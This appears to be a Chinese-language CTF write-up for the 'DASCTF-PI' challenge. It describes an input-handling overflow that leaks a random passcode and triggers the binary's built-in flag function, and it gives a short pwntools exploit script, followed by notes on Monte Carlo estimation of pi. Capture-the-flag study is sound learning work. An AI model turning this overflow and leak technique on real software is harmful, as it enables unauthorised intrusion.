---
author: AngryCanary
tag: WriteUp
layout: post
---

# DASCTF-PI WriteUp

## 核心利用点

>信息泄露:  利用 程序输入函数的逻辑BUG 溢出 粘连 出有价值信息
>
>GetShell: 未GetShell
>
>GetFlag: 程序自带GetFlag。利用Scanf溢出触发

## 程序内容

![text1]({{ site.url }}/assets/pi/text1.png)

![text2]({{ site.url }}/assets/pi/text2.png)

![text3]({{ site.url }}/assets/pi/text3.png)

![text4]({{ site.url }}/assets/pi/text4.png)

![text5]({{ site.url }}/assets/pi/text5.png)

## Exploit

```python
from pwn import*

p = process("./pi")

context.arch = "amd64"

payload1 = "a" * 0xd0

p.sendlineafter("Username:",payload1)

p.recvuntil("a"*64)

radnum = int(p.recv(10),10)

p.sendlineafter("Passcode:",str(radnum)+p64(0)+p64(8)+p64(0x88)*20)

p.sendline("4632251120704552960") #Which OverFLow The Float.

p.interactive()
```

## 额外的收获

### 蒙特卡洛求圆周率方法

>圆周率   ->  周长/直径  =  面积/(半径^2)
>
> 圆面积 / 矩形面积 = (pi * r^2 ) / (2r) ^ 2 = pi / 4 
>
>因为落点随机 求得落在圆中概率-> pi / 4
>
>pi = 概率 * 4
>
>具体算法已经体现在上方程序内容中

